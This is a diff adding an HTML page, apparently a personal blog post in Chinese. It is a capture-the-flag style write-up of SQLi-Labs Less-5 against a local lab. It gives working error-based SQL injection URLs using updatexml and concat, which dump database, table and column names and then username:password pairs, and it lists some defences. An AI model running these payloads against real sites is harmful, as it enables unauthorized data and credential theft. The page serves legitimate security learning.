@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-5 报错注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-5 报错注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.23 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, MySQL, 报错注入</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-5 (GET - Double Injection - Single Quotes - String)</li>
+        <li><strong>提示：</strong>GET请求，双注入（报错注入），单引号闭合</li>
+    </ul>
+
+    <h2>2. 解题思路与核心原理</h2>
+    <p>本关卡属于分水岭，页面不再回显数据库的查询结果（只显示 "You are in........"），因此前四关使用的 <code>UNION SELECT</code> 联合查询失效。但页面依然会抛出详细的 SQL 语法错误。此时需采用 <strong>报错注入（Error-based Injection）</strong> 技术，利用 MySQL 的 XML 处理函数（如 <code>updatexml()</code> 或 <code>extractvalue()</code>），故意制造非法参数错误，将查询结果拼接在报错信息中输出。</p>
+    
+    <h3>报错注入核心函数解析：</h3>
+    <ul>
+        <li><strong>updatexml(目标XML文档, XPath路径, 替换内容)</strong>：用于更新 XML 文档。其第二个参数要求必须是合法的 XPath 路径格式。如果传入非法字符（如 <code>~</code>），数据库会抛出 <code>XPATH syntax error</code> 错误，且会将非法字符原样打印在错误信息中。</li>
+        <li><strong>concat(str1, str2, ...)</strong>：字符串拼接函数。</li>
+        <li><strong>0x7e</strong>：十六进制编码，对应字符 <code>~</code>。用于在报错信息中界定数据边界，防止截断并方便识别。</li>
+        <li><strong>报错长度限制</strong>：MySQL 的报错信息最多只显示 32 个字符。若查询数据过长，需借助 <code>substr()</code> 函数分段截取，或使用自动化脚本遍历提取。</li>
+    </ul>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：探测注入点与闭合方式</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-5/?id=1'</code></p>
+    <p><strong>回显现象：</strong>页面抛出 SQL 语法错误，提示 <code>near ''1'' LIMIT 0,1'</code>。</p>
+    <p><strong>解释与原理：</strong>确认存在单引号字符型注入。使用 <code>?id=1' --+</code> 可正常回显，确认闭合成功。</p>
+
+    <p><strong>验证回显点：</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-5/?id=-1' UNION SELECT 1,2,3 --+</code></p>
+    <p><strong>回显现象：</strong>页面仅显示 <code>You are in........</code>，未显示数字 2 和 3。</p>
+    <p><strong>解释与原理：</strong>确认页面不存在回显点，联合查询无法将数据输出到前端。转入报错注入路线。</p>
+
+    <p><strong>第二步：利用 updatexml 爆出数据库名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-5/?id=1' AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>XPATH syntax error: '~security~'</code>。</p>
+    <p><strong>解释与原理：</strong>通过 <code>concat</code> 将波浪号和库名拼接，强行作为 XPath 路径传入，触发报错并回显当前库名 <code>security</code>。</p>
+
+    <p><strong>第三步：利用 updatexml 爆出表名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-5/?id=1' AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) --+</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>XPATH syntax error: '~emails,referrers,uagents,users~'</code>。</p>
+    <p><strong>解释与原理：</strong>将联合查询中的 <code>SELECT</code> 语句作为子查询嵌入到 <code>updatexml</code> 的参数中。<code>group_concat()</code> 用于将多行表名合并输出。</p>
+
+    <p><strong>第四步：利用 updatexml 爆出列名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-5/?id=1' AND updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'), 0x7e), 1) --+</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>XPATH syntax error: '~id,username,password~'</code>。</p>
+
+    <p><strong>第五步：提取最终数据（触发截断）</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-5/?id=1' AND updatexml(1, concat(0x7e, (select group_concat(username, 0x3a, password) from security.users), 0x7e), 1) --+</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'</code>。</p>
+    <p><strong>解释与原理：</strong><code>0x3a</code> 代表冒号，用于格式化输出。由于报错信息存在 32 字符的物理截断限制，数据未能完整显示。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>无回显导致的失效：</strong>观察到 <code>UNION SELECT</code> 无效后，必须立刻切换攻击思路，不可死磕。</li>
+        <li><strong>数据截断问题：</strong>报错注入天然存在长度限制。在实战（如 HVV）中，若需获取大量数据，必须结合 <code>substr()</code> 函数进行分段截取（如 <code>substr((select ...), 1, 32)</code>），或编写 Python 脚本进行自动化循环提取，亦或尝试寻找其他回显点配合联合查询。</li>
+    </ul>
+
+    <h2>5. 知识点总结与工具说明</h2>
+    <ul>
+        <li><strong>报错注入（Error-based Injection）：</strong>适用于页面无回显但抛出详细 SQL 错误的场景，是 CTF 和实战中重要的数据提取手段。</li>
+        <li><strong>防御手段：</strong>蓝方若关闭详细错误回显（display_errors = Off）、使用预编译（Parameterized Queries）或部署 WAF 拦截敏感字符，可有效防御或阻断报错注入。</li>
+        <li><strong>工具环境：</strong>当前阶段仍为纯手工注入。后续遇到需要使用 Python 编写自动化报错截取脚本时，将在此处详细记录代码编写过程及逻辑解析。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
